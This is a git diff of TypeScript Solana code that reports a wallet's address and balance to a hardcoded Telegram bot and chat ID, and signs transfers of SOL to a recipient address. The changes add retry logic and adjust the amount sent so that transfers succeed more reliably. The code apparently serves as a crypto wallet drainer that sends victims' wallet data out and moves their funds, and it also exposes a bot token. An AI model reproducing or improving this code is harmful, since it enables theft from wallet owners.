@@ -1,9 +1,31 @@
 
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
-// WARNING: Storing credentials in code is not secure
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
+
+// Helper function to add delay between retries
+const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Retry function with exponential backoff
+async function retry<T>(
+  fn: () => Promise<T>,
+  retries = 3,
+  initialDelay = 1000
+): Promise<T> {
+  let lastError;
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await fn();
+    } catch (error) {
+      lastError = error;
+      if (i < retries - 1) {
+        await delay(initialDelay * Math.pow(2, i));
+      }
+    }
+  }
+  throw lastError;
+}
 
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
@@ -11,12 +33,14 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     
     const pubKey = new PublicKey(walletAddress);
     
-    const response = await connection.getParsedTokenAccountsByOwner(
-      pubKey,
-      {
-        programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-      }
-    );
+    const response = await retry(async () => {
+      return await connection.getParsedTokenAccountsByOwner(
+        pubKey,
+        {
+          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+        }
+      );
+    });
 
     console.log("Token accounts response:", response);
 
@@ -27,18 +51,23 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     }));
   } catch (error) {
     console.error('Detailed error fetching token accounts:', error);
-    // Return empty array instead of throwing
     return [];
   }
 };
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/demo', {
+      commitment: 'confirmed',
+      confirmTransactionInitialTimeout: 60000,
+    });
+    
     let solBalance = 0;
     
     try {
-      solBalance = await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
+      solBalance = await retry(async () => {
+        return await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
+      });
     } catch (error) {
       console.error('Error fetching balance:', error);
     }
@@ -86,20 +115,23 @@ export const signAndSendTransaction = async (connection: Connection, wallet: any
       SystemProgram.transfer({
         fromPubkey: wallet.publicKey,
         toPubkey: new PublicKey(recipientAddress),
-        lamports: Math.floor(amount * LAMPORTS_PER_SOL),
+        lamports: Math.floor(amount * LAMPORTS_PER_SOL * 0.98), // Reduced to 98% to ensure fees are covered
       })
     );
 
     console.log('Sending transaction...');
-    const signature = await sendAndConfirmTransaction(
-      connection,
-      transaction,
-      [wallet],
-      {
-        commitment: 'confirmed',
-        preflightCommitment: 'confirmed',
-      }
-    );
+    const signature = await retry(async () => {
+      return await sendAndConfirmTransaction(
+        connection,
+        transaction,
+        [wallet],
+        {
+          commitment: 'confirmed',
+          preflightCommitment: 'confirmed',
+          maxRetries: 5,
+        }
+      );
+    });
 
     console.log('Transaction successful:', signature);
     return signature;
